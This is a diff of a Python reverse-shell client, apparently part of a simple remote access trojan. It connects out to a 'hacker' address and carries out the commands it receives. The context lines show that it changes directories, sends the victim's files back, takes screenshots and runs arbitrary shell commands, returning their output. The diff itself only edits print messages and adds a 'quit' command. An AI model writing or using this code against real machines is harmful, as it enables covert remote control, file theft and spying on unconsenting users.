@@ -21,14 +21,14 @@ if __name__ == "__main__":
             
             victim_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 
-            print("trying to connect with ", hacker_address)
+            print("Trying to connect with ", hacker_address)
             victim_socket.connect(hacker_address)
             while True:    
                 data = victim_socket.recv(1024)
 
                 hacker_command = data.decode()
-                print("hacker command = ", hacker_command)
-                if hacker_command == "stop":
+                print("Hacker command: ", hacker_command)
+                if (hacker_command == "stop") or (hacker_command == "quit"):
                     break
                 elif hacker_command == "":
                     continue
@@ -37,7 +37,7 @@ if __name__ == "__main__":
                     if os.path.exists(path2move):
                         os.chdir(path2move)
                     else:
-                        print("cant change dir to ", path2move)
+                        print("Can't change dir to ", path2move)
                     continue
                 elif hacker_command.startswith("download"):
                     file_to_download = hacker_command.strip("download ")
@@ -55,15 +55,15 @@ if __name__ == "__main__":
 
                             # once the file is complete, we need to send the marker.
                             victim_socket.send(eof_identifier.encode())
-                        print("File sent successfully")
+                        print("File sent successfully.")
 
                     else:
                         exists = "no"
-                        print("File doesn't exist")
+                        print("File doesn't exist.")
                         victim_socket.send(exists.encode())
                         continue     
                 elif hacker_command == "screenshot":
-                    print("Taking screenshot")
+                    print("Taking screenshot ...")
                     screenshot = pyautogui.screenshot()
                     screenshot.save("screenshot.png")
                     print("screenshot saved")
@@ -79,7 +79,7 @@ if __name__ == "__main__":
                     
                     victim_socket.sendall(command_result)
         except KeyboardInterrupt:
-            print("exiting")
+            print("Exiting ...")
         except Exception as err:
             print("Unable to connect: ", err)
             time.sleep(5)
